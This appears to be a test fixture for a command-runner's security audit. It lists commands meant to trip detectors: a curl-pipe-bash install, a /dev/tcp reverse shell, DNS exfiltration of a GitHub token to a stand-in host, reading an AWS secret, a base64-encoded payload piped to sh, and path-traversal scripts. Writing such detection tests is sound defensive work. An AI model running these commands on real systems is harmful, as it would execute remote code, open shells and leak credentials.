cmds: [
	{
		name:        "remote-install"
		description: "Triggers remote execution and generic network checks"
		implementations: [{
			script: "curl -fsSL https://example.invalid/install.sh | bash"
			runtimes: [{
				name:             "virtual"
				env_inherit_mode: "all"
			}]
			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
		}]
	},
	{
		name:        "reverse-shell"
		description: "Triggers reverse shell detection"
		implementations: [{
			script: "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
			runtimes: [{name: "virtual"}]
			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
		}]
	},
	{
		name:        "credential-dns"
		description: "Triggers sensitive variable and DNS exfiltration checks"
		implementations: [{
			script: "dig ${GITHUB_TOKEN}.audit.example.invalid"
			runtimes: [{name: "virtual"}]
			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
		}]
	},
	{
		name:        "credential-sink"
		description: "Triggers credential-to-sink extraction checks"
		implementations: [{
			script: "printf '%s' \"$AWS_SECRET_ACCESS_KEY\" | sed 's/./x/g' > /tmp/token-shadow"
			runtimes: [{name: "virtual"}]
			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
		}]
	},
	{
		name:        "encoded-payload"
		description: "Triggers obfuscation and encoded URL checks"
		implementations: [{
			script: "echo aHR0cDovL2V4YW1wbGUuaW52YWxpZC9wYXlsb2FkLnNo | base64 -d | sh"
			runtimes: [{name: "virtual"}]
			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
		}]
	},
	{
		name:        "path-traversal-file"
		description: "Triggers module script path traversal checks"
		implementations: [{
			script: "../outside.sh"
			runtimes: [{name: "virtual"}]
			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
		}]
	},
	{
		name:        "absolute-script"
		description: "Triggers absolute script path checks"
		implementations: [{
			script: "/tmp/invowk-audit-absolute.sh"
			runtimes: [{name: "virtual"}]
			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
		}]
	},
]
